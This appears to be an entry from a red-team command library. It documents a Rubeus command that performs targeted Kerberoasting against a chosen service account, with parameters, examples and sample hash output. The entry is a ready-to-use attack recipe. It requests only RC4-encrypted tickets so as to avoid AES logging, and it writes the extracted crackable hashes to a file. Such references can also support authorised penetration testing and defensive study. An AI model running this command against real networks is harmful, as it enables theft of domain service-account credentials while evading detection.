---
id: 2bfdaeba-79bc-4ad2-b119-63be750c1ee8
name: rubeus-kerberoast-rc4-user
type: command
executor: cmd
data: >-
  Rubeus.exe kerberoast /user:$_USERNAME /simple /rc4opsec
  /outfile:C:\hashes.txt
output: null
created_at: '2023-01-12T17:49:32.490577+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
platforms:
  - Windows
tags:
  - rubeus
  - kerberoasting
verified: true
validated: true
---

# rubeus-kerberoast-rc4-user

## Command

```cmd
Rubeus.exe kerberoast /user:$_USERNAME /simple /rc4opsec /outfile:C:\hashes.txt
```

## Description

This command uses Rubeus to perform a targeted Kerberoasting attack on a specific user with an SPN, requesting only RC4-encrypted TGS tickets for operational security and saving the hash to a file.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| /user:$_USERNAME | Target username with SPN | Yes |
| /simple | Simplified output format | Yes |
| /rc4opsec | Request RC4 tickets only to avoid AES logs | Yes |
| /outfile | Path to save extracted hashes | Yes |

## Examples

### Basic Usage

```cmd
Rubeus.exe kerberoast /user:svc-mssql /simple /rc4opsec /outfile:C:\hashes.txt
```

### Advanced Usage

```cmd
Rubeus.exe kerberoast /user:svc-mssql /simple /rc4opsec /outfile:C:\hashes.txt /nowrap
```

## Expected Output

[Kerberoast] Requesting 1 tickets...

$krb5tgs$23$*svc-mssql$CORP.LOCAL$kRB5TGS-... (hash saved to file)

## Related

- [[procedures/Find-Kerberoastable-Users-with-SPNs]]
